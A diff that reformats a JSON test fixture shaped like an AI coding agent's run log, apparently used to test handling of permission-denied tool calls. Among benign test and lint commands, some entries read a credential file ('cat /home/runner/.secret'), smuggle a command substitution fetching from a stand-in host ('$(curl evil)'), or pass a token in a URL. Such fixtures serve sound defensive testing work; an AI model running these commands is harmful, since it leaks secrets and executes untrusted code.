@@ -1,23 +1,133 @@
 [
-  {"type": "system", "subtype": "init", "model": "claude-sonnet-5", "tools": ["Read", "Grep"]},
-  {"type": "assistant", "message": {"content": [{"type": "text", "text": "secret prompt content"}]}},
+  {
+    "type": "system",
+    "subtype": "init",
+    "model": "claude-sonnet-5",
+    "tools": [
+      "Read",
+      "Grep"
+    ]
+  },
+  {
+    "type": "assistant",
+    "message": {
+      "content": [
+        {
+          "type": "text",
+          "text": "secret prompt content"
+        }
+      ]
+    }
+  },
   {
     "type": "result",
     "subtype": "success",
     "duration_ms": 372500,
     "num_turns": 55,
     "total_cost_usd": 1.4,
-    "modelUsage": {"claude-sonnet-5": {}, "claude-haiku-5": {}},
+    "modelUsage": {
+      "claude-sonnet-5": {},
+      "claude-haiku-5": {}
+    },
     "permission_denials": [
-      {"tool_name": "Bash", "tool_use_id": "t1", "tool_input": {"command": "composer test -- --filter SecretTest"}},
-      {"tool_name": "Bash", "tool_use_id": "t2", "tool_input": {"command": "composer test"}},
-      {"tool_name": "Bash", "tool_use_id": "t3", "tool_input": {"command": "gh api repos/tarosky/hamelp/pulls/1/comments"}},
-      {"tool_name": "Bash", "tool_use_id": "t4", "tool_input": {"command": "FOO=bar npm run lint"}},
-      {"tool_name": "Bash", "tool_use_id": "t5", "tool_input": {"command": "cat /home/runner/.secret"}},
-      {"tool_name": "Bash", "tool_use_id": "t6", "tool_input": {"command": "$(curl evil) && ls"}},
-      {"tool_name": "Bash", "tool_use_id": "t7", "tool_input": {"command": "git log --oneline -5"}},
-      {"tool_name": "Edit", "tool_use_id": "t8", "tool_input": {"file_path": "/secret/path.php"}},
-      {"tool_name": "WebFetch", "tool_use_id": "t9", "tool_input": {"url": "https://example.com/token=abc"}}
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t1",
+        "tool_input": {
+          "command": "composer test -- --filter SecretTest"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t2",
+        "tool_input": {
+          "command": "composer test"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t3",
+        "tool_input": {
+          "command": "gh api repos/tarosky/hamelp/pulls/1/comments"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t4",
+        "tool_input": {
+          "command": "FOO=bar npm run lint"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t5",
+        "tool_input": {
+          "command": "cat /home/runner/.secret"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t6",
+        "tool_input": {
+          "command": "$(curl evil) && ls"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t7",
+        "tool_input": {
+          "command": "git log --oneline -5"
+        }
+      },
+      {
+        "tool_name": "Edit",
+        "tool_use_id": "t8",
+        "tool_input": {
+          "file_path": "/secret/path.php"
+        }
+      },
+      {
+        "tool_name": "WebFetch",
+        "tool_use_id": "t9",
+        "tool_input": {
+          "url": "https://example.com/token=abc"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t10",
+        "tool_input": {
+          "command": "cd themes/hametuha && php -l functions.php"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t11",
+        "tool_input": {
+          "command": "cd src; vendor/bin/phpunit --filter Foo || true"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t12",
+        "tool_input": {
+          "command": "echo \"a; quotedleak && x\" | grep -c y"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t13",
+        "tool_input": {
+          "command": "echo 'b | singleleak' > out.txt"
+        }
+      },
+      {
+        "tool_name": "Bash",
+        "tool_use_id": "t14",
+        "tool_input": {
+          "command": "cat <<EOF > notes.txt\nheredocleak hunter2\nEOF"
+        }
+      }
     ]
   }
 ]
